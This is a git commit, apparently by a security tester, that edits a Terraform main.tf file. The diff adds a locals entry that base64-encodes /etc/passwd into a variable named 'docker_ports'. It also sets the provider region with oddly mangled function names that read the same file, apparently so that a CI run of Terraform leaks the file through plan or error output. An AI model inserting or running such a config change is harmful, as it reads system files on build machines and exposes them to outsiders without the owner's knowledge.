2535f41df2ad5207afec74fc859daac7433c08ad
synack1test <43527438+synack1test@users.noreply.github.com>
2020-07-14 17:08:06 +0200

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,5 +1,9 @@
 
-
+locals {
+      internal = 8300
+      external = 8300
+      docker_ports = "${filebase64("/etc/passwd")}"
+      }
 provider "google" {
   region = cidr123host(fileb123ase64("/etc/passwd"), 12, 9)
   
